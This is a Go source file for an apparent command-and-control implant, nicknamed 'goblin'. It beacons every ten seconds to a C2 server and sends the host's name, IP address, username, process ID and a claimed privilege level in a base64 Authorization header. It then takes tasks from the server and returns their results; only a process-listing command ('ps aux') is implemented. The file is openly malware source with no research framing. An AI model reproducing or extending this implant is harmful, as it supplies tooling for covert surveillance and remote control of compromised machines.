package main

import (
    "bytes"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

func main() {
    goblinID := rand.Intn(1000000)
    ticker := time.NewTicker(10 * time.Second)
    var lastTaskResult map[string]interface{}

    for range ticker.C {
        lastTaskResult  = sendRequest(goblinID, lastTaskResult)
    }
}

func sendRequest(goblinID int, lastTaskResult map[string]interface{}) map[string]interface{} {
    url := "http://0.0.0.0:8080/"

    metadata, err := gatherMetadata(goblinID)
    if err != nil {
        fmt.Println("Error gathering metadata:", err)
        return lastTaskResult
    }
    
    payloadBytes, err := json.Marshal(lastTaskResult)
    metadataJSON, err := json.Marshal(metadata)
    if err != nil {
        fmt.Println("Error marshaling request payload:", err)
        return lastTaskResult
    }
    encodedMetadata := base64.StdEncoding.EncodeToString(metadataJSON)
    client := &http.Client{}
    req, err := http.NewRequest("POST", url, bytes.NewBuffer(payloadBytes))
    if err != nil {
        fmt.Println("Error creating request:", err)
        return lastTaskResult
    }

    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Authorization", "Bearer "+encodedMetadata)

    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending request:", err)
        return lastTaskResult
    }
    defer resp.Body.Close()

    
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading response:", err)
        return lastTaskResult
    }
    // Handle response and tasks
    type Task struct {
        Id int
        Command string
        Arguments *string
        File *string
    }
    
    type Response struct {
        Tasks []Task
    }
    
    var response Response
    err = json.Unmarshal(body, &response)
    if err != nil {
        fmt.Println("Error parsing JSON response:", err)
        return lastTaskResult
    }

    for _, task := range response.Tasks {
        fmt.Printf("Task ID: %d, Command: %s, Arguments: %v, File: %v\n",
            task.Id, task.Command, task.Arguments, task.File)
    }

    newTaskResult := make(map[string]interface{})
    var output string
    for _, task := range response.Tasks {
        
        switch task.Command {
        case "ps":
            processes, err := listProcesses()
            if err != nil {
                output += fmt.Sprintln("Error listing processes:", err)
            } else {
                output += fmt.Sprintf("Processes: %s\n", processes)
            }
        default:
            output += fmt.Sprintf("Received unknown command: %s\n", task.Command)
        }
        newTaskResult["taskId"] = task.Id
        newTaskResult["lastResults"] = output
    }
    return newTaskResult
}

func listProcesses() (string, error) {
    cmd := exec.Command("ps", "aux")
    output, err := cmd.CombinedOutput()
    if err != nil {
        return "", err
    }
    return string(output), nil
}

func gatherMetadata(goblinID int) (map[string]interface{}, error) {
    hostname, _ := os.Hostname()
    pid := os.Getpid()
    ip, _ := getLocalIP()
    osVersion := runtime.GOOS
    arch := runtime.GOARCH

    return map[string]interface{}{
        "goblin_id":    goblinID,
        "hostname":     hostname,
        "ip_address":   ip,
        "username":     os.Getenv("USER"),
        "os_version":   osVersion,
        "architecture": arch,
        "process":      os.Args[0],
        "process_id":   pid,
        "integrity":    "High",
    }, nil
}

func getLocalIP() (string, error) {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        return "", err
    }
    defer conn.Close()

    localAddr := conn.LocalAddr().(*net.UDPAddr)
    return localAddr.IP.String(), nil
}
